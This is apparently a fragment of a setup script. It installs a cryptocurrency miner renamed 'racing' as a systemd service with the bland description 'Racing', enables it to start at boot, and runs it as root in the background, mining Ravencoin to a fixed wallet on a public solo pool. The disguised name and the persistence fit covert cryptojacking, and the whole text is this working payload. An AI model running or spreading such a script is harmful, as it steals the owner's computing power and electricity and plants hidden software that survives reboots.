...
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://solo-rvn.2miners.com:7070 -u RM11VvoTyD4CeixsMLHR9ntqpaMTKHMEYL.abc -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
sudo ./racing -a kawpow -o stratum+tcp://solo-rvn.2miners.com:7070 -u RM11VvoTyD4CeixsMLHR9ntqpaMTKHMEYL.abc -p x &
